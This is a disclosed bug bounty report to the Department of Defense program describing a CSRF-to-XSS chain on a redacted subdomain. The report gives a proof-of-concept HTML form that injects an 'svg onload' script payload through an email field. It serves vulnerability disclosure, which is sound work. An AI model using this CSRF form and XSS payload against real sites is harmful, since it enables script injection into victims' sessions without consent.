# CSRF Based XSS @ https://██████████

## Report Details
- **Report ID**: 1147949
- **URL**: https://hackerone.com/reports/1147949
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-04-03T18:48:35.803Z
- **Disclosed**: 2021-06-30T20:44:03.799Z

## Reporter
- **Username**: nagli
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
## Summary:
Good Afternoon Team,

I recently discovered subdomain https://██████████/█████████ from a POST Based XSS which when combined with CSRF allows for seemless XSS.

███

HTTP Request
```
POST /██████ HTTP/1.1
Host: █████████
Connection: close
Content-Length: 619
Cache-Control: max-age=0
sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
Origin: https://███████
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://█████/████
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8,eu;q=0.7,he;q=0.6
Cookie:███████

██████████
```

Owing to the lack of CSRF Protections in the above request, it is trivial to chain CSRF -> XSS on this domain.
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://███/████████" method="POST">
      <input type="hidden" name="action" value="F█████" />
      <input type="hidden" name="token" value="████████" />
      <input type="hidden" name="frm&#95;email" value="nagli&#64;wearehackerone&#46;com&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;document&#46;domain&#41;&gt;" />
      <input type="hidden" name="frm&#95;zip5" value="12121" />
      <input type="hidden" name="cmd&#95;submit" value="Submit" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

~ @naglinagli

## Impact

Utilizing this an attacker could easily carry out the below
XSS on *.██████████

## System Host(s)
████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Set up the following HTML page

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://█████/████████" method="POST">
      <input type="hidden" name="action" value="F███████" />
      <input type="hidden" name="token" value="███████" />
      <input type="hidden" name="frm&#95;email" value="nagli&#64;wearehackerone&#46;com&quot;&gt;&lt;svg&#47;onload&#61;alert&#40;document&#46;domain&#41;&gt;" />
      <input type="hidden" name="frm&#95;zip5" value="12121" />
      <input type="hidden" name="cmd&#95;submit" value="Submit" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

And click.

## Suggested Mitigation/Remediation Actions
Sanitize the input being inserted into the frm_email field.

Btw, I think I reported this once and it was fixed, not sure why it reverted back.



## Attachments
No attachments
